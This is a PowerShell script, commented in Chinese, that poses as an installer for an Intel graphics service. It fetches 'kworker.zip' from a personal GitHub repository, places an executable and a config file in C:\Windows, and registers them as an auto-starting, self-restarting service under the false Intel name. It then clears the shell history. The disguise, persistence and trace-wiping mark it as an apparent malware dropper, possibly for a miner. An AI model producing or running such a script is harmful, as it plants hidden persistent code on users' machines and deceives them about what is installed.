# Intel(R) Dynamic Graphic Windows 一键安装脚本
# 必须以管理员身份运行

# 设置变量
$ServiceName = "Intel(R) Dynamic Graphic"
$InstallDir = "C:\Windows\Intel(R) Dynamic Graphic"
$DownloadUrl = "https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/win/kworker.zip"
$ExeName = "Intel(R) Dynamic Graphic.exe"
$ConfigName = "c"

# 设置控制台编码
chcp 65001 > $null

# 颜色输出函数
function Write-Info { Write-Host "[信息] $args" -ForegroundColor Cyan }
function Write-Success { Write-Host "[成功] $args" -ForegroundColor Green }
function Write-Warning { Write-Host "[警告] $args" -ForegroundColor Yellow }
function Write-Error { Write-Host "[错误] $args" -ForegroundColor Red }

# 检查管理员权限
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "请以管理员身份运行此脚本"
    Write-Host "右键点击 PowerShell -> 以管理员身份运行，然后执行: .\install.ps1"
    exit 1
}

Write-Host "=========================================="
Write-Host "   Intel(R) Dynamic Graphic 一键安装脚本"
Write-Host "=========================================="
Write-Host ""

# 1. 创建安装目录
Write-Info "正在创建安装目录..."
if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}
Write-Success "目录创建成功: $InstallDir"

# 2. 下载文件
Write-Info "正在下载程序包..."
$zipPath = "$InstallDir\kworker.zip"
try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $zipPath -UseBasicParsing
} catch {
    Write-Error "下载失败: $_"
    exit 1
}
Write-Success "下载完成"

# 3. 解压文件
Write-Info "正在解压文件..."
try {
    Expand-Archive -Path $zipPath -DestinationPath $InstallDir -Force
} catch {
    Write-Error "解压失败: $_"
    exit 1
}
Write-Success "解压完成"

# 4. 清理临时文件
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# 5. 验证关键文件
$exePath = "$InstallDir\$ExeName"
$configPath = "$InstallDir\$ConfigName"

if (-not (Test-Path $exePath)) {
    Write-Error "未找到 $ExeName"
    exit 1
}
if (-not (Test-Path $configPath)) {
    Write-Error "未找到配置文件 $ConfigName"
    exit 1
}
Write-Success "文件验证通过"

# 6. 删除旧服务（如果存在）
Write-Info "清理旧服务..."
$existingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($existingService) {
    Write-Info "停止并删除旧服务..."
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    sc.exe delete "$ServiceName" | Out-Null
    Start-Sleep -Seconds 1
}

# 7. 创建 Windows 服务
Write-Info "正在创建 Windows 服务..."
$binPath = "`"$exePath`" --config=`"$configPath`""
& sc.exe create "$ServiceName" binPath= $binPath start= auto DisplayName= "$ServiceName"

if ($LASTEXITCODE -ne 0) {
    Write-Error "服务创建失败"
    exit 1
}

# 设置服务描述
& sc.exe description "$ServiceName" "Intel 动态图形管理服务"
Write-Success "服务创建成功"

# 8. 配置服务失败时自动重启
& sc.exe failure "$ServiceName" reset= 86400 actions= restart/5000/restart/10000/restart/30000

# 9. 启动服务（关键步骤）
Write-Info "正在启动服务..."
try {
    Start-Service -Name $ServiceName -ErrorAction Stop
    Start-Sleep -Seconds 2
} catch {
    Write-Error "服务启动失败: $_"
    Write-Warning "请手动检查: services.msc"
    exit 1
}

# 10. 确认服务状态
$service = Get-Service -Name $ServiceName
if ($service.Status -eq 'Running') {
    Write-Success "服务已成功启动，当前状态: Running"
} else {
    Write-Warning "服务状态异常: $($service.Status)"
}

# 11. 确认开机自启设置
$startupType = (Get-CimInstance -ClassName Win32_Service -Filter "Name='$ServiceName'").StartMode
if ($startupType -eq 'Auto') {
    Write-Success "开机自启已设置: 自动"
} else {
    Write-Warning "开机自启设置异常: $startupType"
}

# 12. 输出完成信息
Write-Host ""
Write-Host "=========================================="
Write-Success "安装完成！"
Write-Host "=========================================="
Write-Host "安装目录: $InstallDir"
Write-Host "服务名称: $ServiceName"
Write-Host "服务状态: $($service.Status)"
Write-Host "启动类型: 自动"
Write-Host ""
Write-Host "常用命令:"
Write-Host "  查看状态: Get-Service `"$ServiceName`""
Write-Host "  启动服务: Start-Service `"$ServiceName`""
Write-Host "  停止服务: Stop-Service `"$ServiceName`""
Write-Host "  重启服务: Restart-Service `"$ServiceName`""
Write-Host "  删除服务: sc.exe delete `"$ServiceName`""
Write-Host ""
Write-Host "验证自启动: 重启电脑后服务应自动运行"
Write-Host "=========================================="

# 清理历史记录
Clear-History